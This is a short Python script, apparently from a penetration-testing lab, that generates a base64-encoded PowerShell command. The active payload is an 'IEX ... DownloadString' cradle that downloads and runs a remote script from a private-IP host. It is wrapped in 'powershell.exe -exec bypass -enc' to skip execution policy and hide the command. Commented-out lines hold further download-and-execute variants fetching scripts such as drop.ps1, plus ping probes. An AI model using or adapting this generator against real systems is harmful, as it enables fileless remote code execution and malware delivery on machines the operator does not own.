import sys
import base64


#payload =  'Test-Connection -ComputerName 192.168.49.115 -Count 2 -Quiet'
#payload = 'Test-Connection -ComputerName 192.168.49.115 -Count 2 -Quiet'
#payload = "IEX(New-Object Net.webclient).downloadString('http://192.168.45.250/Candlestick.ps1'); IEX(New-Object Net.webclient).downloadString('http://192.168.45.250/drop.ps1')"
#payload = "IEX(New-Object Net.webclient).downloadString('http://192.168.49.70/payload64.txt')" 
payload = "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.49.70/test.ps1')"

cmd = "powershell.exe -exec bypass -enc " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmd)
